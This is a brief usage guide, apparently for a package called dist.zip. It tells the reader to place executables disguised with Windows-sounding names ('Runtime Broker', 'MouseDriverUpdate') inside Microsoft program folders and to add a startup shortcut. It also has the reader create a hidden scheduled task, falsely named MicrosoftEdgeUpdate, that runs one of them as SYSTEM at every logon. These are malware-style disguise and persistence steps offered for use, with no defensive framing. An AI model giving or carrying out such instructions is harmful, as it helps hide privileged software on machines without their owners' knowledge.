Usage:
1. Unzip dist.zip
2. Go to C:\Program Files\Microsoft Update Health Tools and copy Runtime Broker into it
3. Go to C:\Program Files (x86)\Microsoft\Edge and add MouseDriverUpdate to it
4. Go to C:\Program Files\Windows Mail and add MouseDriverUpdate to it
5. Go to This PC Music, add TaskScheduler.exe to it
6. Add TaskScheduler shortcut to C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
Open Task Scheduler
Create new task
Name: MicrosoftEdgeUpdate
Change User or Group: SYSTEM
Run with highest privileges, Hidden
Trigger: At logon
Actions: Start program: C:\Program Files\Microsoft Update Health Tools\Runtime Broker
